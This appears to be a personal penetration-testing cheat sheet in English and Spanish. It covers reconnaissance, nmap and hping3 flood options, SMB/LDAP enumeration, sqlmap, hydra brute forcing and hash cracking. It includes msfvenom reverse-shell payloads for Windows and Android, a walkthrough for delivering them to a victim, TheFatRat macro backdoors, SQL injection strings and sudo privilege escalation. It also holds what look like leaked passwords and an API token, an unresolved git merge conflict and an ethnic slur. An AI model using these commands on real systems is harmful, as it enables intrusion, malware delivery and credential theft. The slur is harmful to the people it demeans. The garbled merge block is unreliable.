Information Gathering
````js
•	https://larutadelhacker.com/google-dorks-busquedas-avanzadas-en-google/ Google Dorks
•	https://dorksearch.com/ Google Dorks
•	https://citizenevidence.amnestyusa.org/ Youtube Data viewer
•	https://www.searchftps.net/ Search FTPs
•	https://www.shodan.io/ Information Gathering
•	https://github.com/JavierOlmedo/shodan-filters Filters Shodan
•	https://sitereport.netcraft.com/ Information Gathering
•	https://www.peekyou.com/ People Search
•	https://tineye.com/ People Search
•	https://yandex.com/images/ People Search
•	TheHarvester – Information Gathering
•	https://search.censys.io/ - Footprinting passive
•	https://www.zoomeye.org/ Footprinting passive
•	https://github.com/sherlock-project/sherlock People Search
•	Ping -l (preload many packets Ej: 1300) -f (flood ping) -i (time) -n (amount)
•	https://website.informer.com/ Web Site Footprinting
•	http://www.webextractor.com/ Extractor de información de paginas web
•	https://www.httrack.com/ Web Site Copier
•	https://emailtracker.website/pro  Email tracker
•	https://whois.domaintools.com/ Whois Lookup
•	nslookup - dns footprinting
•	http://www.kloth.net/services/nslookup.php DNS lookup
•	https://www.yougetsignal.com/ DNS lookup
•	dnsrecon – Tool parrot 
•	https://www.arin.net/  DNS lookup
•	tracert – Tool (-h amount salts)
````
3.	SCANNING

````js
/////Nmap
	-PE: Ping ICMP ECHO scan
	-PU: UDP ping Scan
	-PR: arp ping scan 
-PP: ICMP timestamp Ping Scan
-PM: ICMP address MASK Ping Scan
-PS: TCP SYN Ping Scan
-PA: TCP ACK Ping Scan
-PO: IP Protocol Ping Scan
-n: deshabilitar resolución de dns
-sn: deshabilitar escaneo de puertos
-Pn: Deshabilitar ping scan
-sT: TCP scan
-sS: stealth scan
-sX: Xmas scan FIN, PSH, and URG flags
-sA: ACK scan
-sU: UDP scan
-O: OS detection
-sV: versión services
-sC: scripts mas utilizados sobre los servicios encontrados
-A: escaneo agresivo, incluye -O -sV -sC –traceroute
NetworkIP/Mask – Search IPs on network
-f: fragmentación de paquetes para evadir firewalls
-g <port>: source port manipulation
-mtu: especificar cantidad máxima de transmisión de paquetes (8)
-D RND:<num> : genera N IP address
•	Angry IP Scanner – Tool Windows
•	MegaPing – Tool Windows
•	NetScanTools – Tool Windows
•	Hping3
-p: range ports
-U: URG flag
-P: Push flag
-F: fin flag
-c: count flags
--scan: scan ports
--udp: UDP scan 
--rand-source: IP random
--data: tamaño del cuerpo del paquete 
--flood: técnica de Inundación de TCP
````

#### Enumeration
#### host enumation
host and service enumeration
````js
//discover devices inside the network eth0
netdiscover -i eth0
nmap -sN 10.10.10.0/24
for /L %V in (1 1 254) do PING -n 1 192.168.0.%V | FIND /I "TTL"

// enumeration
netstat -a 10.10.10.10 // netstat enumeration netbios
snmp-check 10.10.10.10 // extract users from netbios - parrot
enum4linux
sudo nmap -vv -p 1-1000 -sC -A 10.10.10.10 -oN nmap_scan
nmap -p- -sS -min-rate 10000 -Pn -n 10.10.10
nmap -6 www.scanme.com // scan IPV6
nmap -sC -sV -vvv -T5 -p 80,21,2222 10.10.10
sudo nmap -v -sV -sC
nmap -Pn -sS -n 10.10.. -T4 -oN nmap_scan // [prefer] fast scan ufo mode
nmap -v -p- -sV -sC -T4 10.10 -oN nmap_scan // UDP/TCP scanning
sudo nmap -p- -Pn -vvv -sS 10.10.. -oN nmap_scan
nmap -sS -sV -A -O -Pn
nmap -sV -sT -sU -A 10.10.. -oN nmap_scan
sudo nmap -p- 10.10.. --open -oG nmap/AllPorts -vvv -Pn -n -sS
sudo nmap -p22,80 -sV -sC -Pn -n 10.10.. -oN nmap/openports -vvv
nmap -sV -p 22,443 10.10../24 // scan mi net 24
nmap -sU -p 161 -sV -sC 10.10.. // UDP Scan
nmap -A --min-rate=5000 --max-retries=5 10.10.. // optimize scan time
<<<<<<< HEAD
nmap -Pn -sS -A -oX test 10.10.10.0/24 // Scanning the network and subnet
-PR = ARP ping scan
-PU = UDP ping scan
=======
nmap -Pn -sS -A -oX test 10.10.../24 // scanning network subnet
//scripts
snmp //extract users of the network port 161
-PR = ARP ping scan
-PE = ICMP scan echo
-PU = UDP ping scan
-oX = save XMl
>>>>>>> df364a4f409faf7bc6bb4b291db58d3dcabb2bb9
-vv = verbose
-p = ports
-sC = default scripts
-A = agressive scan
-oN = save in a file
-sS = syn scan is untrusive because don't complete the petitions
-n = no resolution of dns
-p- = all ports
-sV = Probe open ports to determine service/version inf
-T4 = Timing scanning <1-5>
-o = output to save the scan
-sT = TCP port scan
-sU = UDP port scan
-A = Agressive/ OS detection  
--open = all ports open
-oG = save in a grep format
-Pn = no do ping to the ip
-n = dont resolve domain names
--max-retries = 1 default verify 10 times.
-O = verifica el sistema operativo
// My niggerian methodology
nmap -sV -sC nmap 10.10.10.x #top1000ports
nmap -sC -sV -v -oN nmap.txt
masscan -e tun0 -p1-65535 -rate=1000 <ip>
sudo nmap -sU -sV -A -T4 -v -oN udp.txt ip
````

•	OS Detection TTL

![image](https://user-images.githubusercontent.com/32601403/221194121-9a76af3a-d0e0-4e1e-b636-c596cb97830f.png)
 



#### default ports
| port | name|
| :--- | :--- |
| 3306 | mysql --script mysql-info mysql-enum|
| 3389 | rdp port remote port
| 25 | smtp mail
| 80 | http
| 443 | https
| 20 | ftp
| 23 | telnet
| 143 | imap
| 22 | ssh
| 53 | dns

````js
•	Unicornscan – Scan Network
-I: Immediate scan
-v: verbose
•	Colasoft Packet Builder – network scanner
•	
4.	ENUMERATION
Nbstat – NetBIOS enumeration
Net – NetBIOS enumeration
NetBiosEnumeratior – Tool Windows
````

////Enum SNMP
````js
Snmp-check – SNMP Enumeration
Comando snmpget con SNMPv1:
 
snmpget -v1 -c [cadena de comunidad] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv2:
snmpget -v2c -c [cadena de comunidad] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv3 (autenticación, pero sin cifrado):
snmpget -v3 -l authNoPriv -u [nombre de usuario] -a MD5 -A [hash MD5 de la contraseña de usuario] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv3 (autenticación y cifrado):
snmpget -v3 -l authPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] -x DES -X [contraseña DES] [dirección IP del host] [OID para update check]
Comando snmpget con SNMPv3 (sin autenticación ni cifrado):
snmpget -v3 -l noAuthNoPriv -u [nombre de usuario] [dirección IP del host] [OID para update check]

Comando snmpwalk con SNMPv1:
 
snmpwalk -v1 -c [cadena de comunidad] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv2:
snmpwalk -v2c -c [cadena de comunidad] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv3 (autenticación, pero sin cifrado):
snmpwalk -v3 -l authNoPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv3 (autenticación y cifrado):
snmpwalk -v3 -l authPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] -x DES -X [contraseña DES] [dirección IP del host] [OID de la MIB de la información del sistema]
Comando snmpwalk con SNMPv3 (sin autenticación ni cifrado):
snmpwalk -v3 -l noAuthNoPriv -u [nombre de usuario] [dirección IP del host] [OID de la MIB de la info rmación del sistema]
````
````
SoftPerfect Network Scanner – Tool Windows
````
LDAP Enumerator
````
AD Explorer 
ldapsearch
ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://192.168.178.29
ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W
ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://192.168.178.29 -D "cn=admin,dc=devconnected,dc=com" -W 
ldapsearch <previous_options> "uid=jo*"
````
````
//DNS Enum
````js
•	Dig – DNS Enumeration
Axfr – transferencia de Zona (@NS)
Ns – name server
•	Nslookup 
Set type=<query>
•	Dnsrecon
-z DNSSEC
MX
SOA
NS
A
AAAA
SPF 
TXT
•	Global Network Inventory – Tool Windows
````


////Other Enum
````js
Enum4linux
Port:445/TCP

poetry run crackmapexec smb <IP/DNS>

poetry run crackmapexec smb <IP/DNS> -u '<usuario>' -p '<password>' --shares

smbclient -L <IP/DNS>

Smbmap -H <IP/DNS>

Smbmap -H <IP/DNS> -r <RUTA>

Smbmap -H <IP/DNS> --download <archivo>

gpp-decrypt <HASH PASSWORD>

rpcclient -U '<usuario>%<password>' <IP/DNS> 

rpcclient -U '<usuario>%<password>' <IP/DNS> -c <Help>

rpcclient -U "" <IP  -N
Rpcclient -u "" <IP> -N

Rpcclient -u "" <IP> -N -c <comando: enumdousers> 

Rpcclient -u "" <IP> -N -c <comando: enumdomusers> | grep -oP '\[.*?\]'  | grep -v 0x | tr -d '[]'

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18


GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request


python3 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe

````

#### enumerating -samba
````
search for commands
smbmap --help | grep -i username
smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
-x = command
````
5.	VULNERABILITY ANALYSIS
````js

Nessus 
OpenVAS
Nikto – Web Vulnerability
arachni
nikto -h url -Cgidirs all
Netsparker Application Security Scanner — Application security scanner to automatically find security flaws.

Nikto — Noisybut fast black box web server and web application vulnerability scanner.

Arachni — Scriptableframework for evaluating the security of web applications.

w3af — Webapplication attack and audit framework.

Wapiti — Blackbox web application vulnerability scanner with built-in fuzzer.

SecApps — In-browserweb application security testing suite.

WebReaver — Commercial,graphical web application vulnerability scanner designed for macOS.

WPScan — Blackbox WordPress vulnerability scanner.

Zoom — Powerfulwordpress username enumerator with infinite scanning.

cms-explorer — Revealthe specific modules,plugins,components and themes that various websites powered by content management systems are running.

joomscan — Joomlavulnerability scanner.

ACSTIS — Automatedclient-side template injection (sandboxescape/bypass)detection for AngularJS.

SQLmate — Afriend of sqlmap that identifies sqli vulnerabilities based on a given dork and website![image](https://user-images.githubusercontent.com/32601403/221203684-411db2d8-5e9c-4d16-830c-6fad943ffda2.png)


````
6.	SYSTEMS HACKING
````js
Responder -I <interface>
Jhon The Ripper
John -list=formats (Escogemos un formato)
 	John --format=RAW-md5 --wordlist=<RUTA> <HASH>

Hash-identifier <HASH> - Identificar HASH

L0phtCrack7 – Tool Windows

https://www.exploit-db.com Exploit DB
https://www.variotdbs.pl/  search exploit
https://sploitus.com/ search exploit
searchsploit – tool linux
nsfvenom -p windows/meterpeter/reverse_tcp –platform windows -a x86 -f exe LHOST=<> LPORT=<> -o salida
-p plataforma
-a arquitectura
-f Formato de archivo de salida
LHOST lisent host
LPORT lisent port
-o Salida

https://github.com/PowerShellMafia/PowerSploit - Post explotacion 
TheFatRat
 Inmunity Debugger
````
#### Web Enumeration & attack
````js
// dir enumeration
gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q
gobuster dir -u http://training.breakthecode.com/ -w /usr/local/dirbuster/directory-list-2.3-medium.txt -x .xml -t 4
ffuf -H "Host: FUZZ.<DNS>" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<IP> -fs 169
https://sourceforge.net/projects/dirbuster/

Java -jar Dirbuster-0.12.jar


dir : directory listing
-u : host
-w : wordlists
-t : threads int / Number of concurrent threads (default 10)
-x : enumerate hidden files htm, php
-q : –quiet / Don’t print the banner and other noise
// wordpress enumeration
wpscan --url https://localchost.com --passwords=
wpscan -u 10.10.. -e u vp
wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce
-e = enumerate
u = enumerate usernames
vp = vulnerable plugins
wpscan --url http://url  --api-token FRG9WoXBibili6ZqS0u7ght7USVMxbbyHf0IhiI48zo
--username "/home/user/Desktop/users-btc.txt" --password "/home/user/Downloads/Passwords-BTC.txt"
-e ap
-e u

// wordlist generation
cewl -w wordlist -d 2 -m 5 http://wordpress.com
-d = deeph of the scanning
-m = long of the words
-w = save to a file worlist
````
#### web explotation
````js
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump
-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli
#### basic sqli injection
//SQLMap
-u: URL
-r: archive post
-p variable inyectable en post
--dbs: descubrimiento de DB
-D nombre de la DB
--tables encontrar tablas de la DB
-T nombre de la tabla
--dump extraer info del contenido de la tabla
--random-agent --tamper=space2comment --level 2 --risk 1
--os-shell

sqlmap -u 10.10.77.169 --forms --dump
- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries
// extract database
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
````
#### bruteforcing
````
hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
hydra -l <username> -P <wordlist> 10.10.210.31 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
hydra -l <username> -P <full path to pass> 10.10.210.31 -t 4 ssh
 hydra -l user -P passlist.txt ftp://10.10.210.31
````
#### stego
````js
exiftool cats.png
zsteg cats.png
binwalk -d cats.png
// windows
snow -C -p "magic" readme2.txt
-p = passowrd
//image steganography
openstego > extract dat > 
//stegseek to crack stego password
````
#### windows rpc mal configurado
````
rpcclient 10.10.123.10
````
#### hashcracking
**hashcat**
````terminal
hashcat -O -w3 -m 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --show
-m = type of hash
-a = attack mode (1-3) 3 bruteforcing
--show = mostrar hash crackeado
hashcat -O -A 0 -m 20 salt12314124:passowrdmd523432 /usr/share/worlist/rockyou.txt
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
````
**john**
````
john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt
- --format = hash format '--list=formats | grep MD5'
- hash = file - echo '123213dasd' >> hash
- wordlist= = wordlist to crack
### to show the hash cracked
john --show --format=Raw-MD5 hash
- --show = show the hash:Cracked

John -list=formats


Escogemos un formato


John --format=RAW-md5 --wordlist=<RUTA> <HASH>
````
**cryptography**
```js
//HashCalc
take a file and open into hashcalc
i will give you the the hash for md5 or other algorithms
// MD5 calculator
it will compare both files what we need get the md5
// HashMyFiles
it allow you to hash all the files inside a folder
// Veracrypt
Hash-identifier <HASH>

```
**rainbowtables**
```js
Rainbowtables are already hash with password to perform cracking without calculate a new hash.
// linux
rtgen // rainbowcrack
rtgen sha256 loweralpha-numeric 1 10 0 1000 4000 0 // generate a new rainbow table
// windows
rtgen md5 loweralpha-numeric 1 4 1 1000 1000 0 //
then use app rainbowcrack // add the hashes and the rainbow table option
```
### wireshark
````js
### wireshark filters
// filters by post
http.request.method==POST
smtp // email
pop // email
dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
dns.flags.response == 0 = There are 56 unique DNS queries.
tcp // show tcp packets
//find packets
edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search
//DDOS ATTACK
look number of packets first column
then >statistics > ipv4 statistics > destination and ports
/// tshark cli
tshark -r dns.cap | wc -l //count how many packets are in a capture
tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
````
#### Privilege scalation reverse shell
````
ssh -p 2222 mith@10.10.123.23
sudo -ls ###list de su permisions
sudo vim -c ':!/bin/sh' ### privilege scalation
````
https://gtfobins.github.io/
#### other
``````Js
hydra -l root -P passwords.txt [-t 32] ftp
hydra -L usernames.txt -P pass.txt mysql
hashcat.exe -m hash.txt rokyou.txt -O
nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 0.10.10 
wpscan --url https://10.10.10.10 --enumerate u
netdiscover -i eth0
john --format=raw-md5 password.txt [ To change password to plain text ]
``````
#### vulnerability scanning
```
nikto -h url -Cgidirs all
```
#### System hacking
```js
// 1 - on a windows machine
wmic useraccount get name,sid //list users
// using a tool
Pwdump7.exe >> /path/file.txt //get a file to crack
// using ophcrack to crack the hash with rainbow tables
ophcrack >> tables >> vista free
// cracking with rainbow tables using winrtgen to create a rainbow table
winrtgen >> add table >> hashntlm
rainbowcrack >> select the obtained file >> select dircreatd with winrtgen
// 2 - using responder to capture the traffic of the windows system
//run a shared folder on windows
//capture the ntlm hash >> cracking with jhon
chmod +x responder.py
./Responder.py -I eth0
-I = interface //ifconfig
// cracking the ntlm capture with ntlm
john capture.txt
lopthcr4ck // helps to crack ntlm passwords store on windows
// system hacking windows
// look for an exploit and try to get remote access to the victim using msfvnom,metasploit and rat
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=my.ip LPORT=my.port -o /root/Desktop/test.exe
-p = payload
--platform = Os
-a = architecture
-f = format of the payload
-o = output dir
// now with try to share the file with the victim
// we try three forms
// #1 - option
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
// copy the text.exe to the new server
cp /root/Desktop/test.exe /var/www/html/share
// #2 - option
python -m SimpleHttpServer 80
// #3 - option
python3 http.server 80
// start the serverwith apache
service apache2 start //apache version
//now we open msfconsole to gain a inverse shell with meterpreter
use exploit/multi/handler //similar to nc -nlvp .port
set payload windows/meterpreter/reverse_tcp
set LHOST my.ip
set LPORT my.port
exploit/run // run the exploit
//share the file with the victim
my.ip/share
//inside the victim's machine
run the exe // text.exe share with the server
//look at the metasploit session
sysinfo // system info
//now with try to enumerate to know misconfigurations on the w10 system
//using PowerSploit
upload /path/PowerUp.ps1 powerup.ps1 // with meterpreter
shell // with shell with change from meterpreter to windows shell
// now we execute powerup
powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
// now we know that windows is vulnerable to dll injection
// change to meterpreter shell with exit & run
run vnc // will open a VNC remote control on the victim
// Now we will try another method to gain access to a machine
// with TheFatRat
chmod +x fatrat
chmod +x setup.sh
chmd +x powerfull.sh
./setup.sh
//run fatrat
option 6 // create fud.. [Excelent]
option 3 // create apache + ps1
//put the lhost and lport
enter the name for files : payload
option 3 // for choosing meterpreter/reverse_tcp
// payload generated
option 9 // back to the menu
option 7 // create a back office
option 2 // macro windows and select lhost and lport
// enter the name for the doc file
// use custom exe backdoor Y
option 3 // reverse_tcp 
// backdoor inside the doc generate
// share document with the server option 1 and 2 above
// start msfconsole to gain meterpreter shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST my.ip
set RHOST my.port
exploit / run 
```
#### Mobile Hacking
```js
// create a backdoor with msfvenom
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=my.ip R > path/backdoor.apk
// share with some of the three methods above
// now with metasploit
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST my.ip
exploit -j -z // exploit with a background job
// install the apk in android & the session will open
sessions -i 1 // will display the meterpreter
sysinfo // to know the os
// Using PhoneSploit
run phonesploit
option 3 // new phone
enter the ip // ip' phone &
option 4 // to shell on the phone
//in the menu you can search, download, info
```
#### Using the methodology
1.  `netdiscover -i eth0`
2.  `map -p- 10.10.10.10 [ Any IP ]` port discovery
3. `nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10`
4. `gobuster -e -u** http://10.10.10.10 -w wordlsit.txt` on a webserver running
5. trying sqli payloads on the forms
```
admin' --  
admin' #  
admin'/*  
' or 1=1--  
' or 1=1#  
' or 1=1/*  
') or '1'='1--  
') or ('1'='1—
```
6. bruteforcing web servers
```
hydra -l root -P passwords.txt [-t 32] <IP> **_ftp_**
hydra -L usernames.txt -P pass.txt <IP> **_mysql_**
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> **_pop3_** -V
hydra -V -f -L <userslist> -P <passwlist> **_rdp_**://<IP>
hydra -P common-snmp-community-strings.txt target.com **_snmp_**
hydra -l Administrator -P words.txt 192.168.1.12 **_smb_** -t 1
hydra -l root -P passwords.txt <IP> **_ssh_**
```
7. `cewl example.com -m 5 -w words.txt` custom wordlist
8. search for vulns
```js
searchsploit 'Linux Kernel'
searchsploit -m 7618 // Paste the exploit in the current directory
searchsploit -p 7618[.c] // Show complete path
searchsploit — nmap file.xml // Search vulns inside a Nmap XML result
``` 

comando para buscar archivos en Windows con powershell
``` 
Get-ChildItem C:\ -Filter *.pst -Recurse 
``` 
Administrar y Desahabilitar Windows Defender
``` 
Get-Command -Module Defender
``` 

2.	FOOTPRINTING


#####Google Dorks

|Operador|	Descripción|	Ejemplo|
| :--- | :--- |:--- |
|“ ”	|Coincide exactamente con el texto entre comillas dobles| “Behackerpro”|
|–	|Excluye de la búsqueda el término que va después del signo “-”|	malware -ransomware
|+	Incluye el término de va después del signo “+”	|ciber +resiliencia
|"#"	|Busca un hashtag	|"#"pentesting
|OR	Devuelve resultados sobre un término u otro	|Smartphone OR tablet
| barra	|Devuelve resultados sobre un término u otro. El mismo OR	|blackhat 1 defcon
|( )	|Utilizado para agrupar operadores	|(ballmer OR gates) windows
|cache:	|Muestra la página en cache	|cache:www.eltiempo.co.
|inurl:	|Busca el termino escrito dentro de la URL de los sitios indexados	|inurl:admin.php
|site:	|Busca todo lo relacionado con el termino escrito como sitio	|site:.eltiempo.com -site:www.eltiempo.com -inurl:blogs
|filetype:	|Buscar el termino escrito como tipo de archivo, ejemplo: pdf, pptp, log, sql	|filetype:log
|intitle:	|Busca el termino escrito dentro del título	|intitle:mikrotik
|allintitle:	|Devuelve resultados que coincidan en el título con el término escrito	|allintitle:”Noticias Principales de Colombia”
|intext:	|Busca páginas que en su texto contienen el termino escrito 	|intext:owasp
|allintext:	|Devuelve todos los resultados que contengan todas las palabras especificadas	|allintext:”asterisk digium
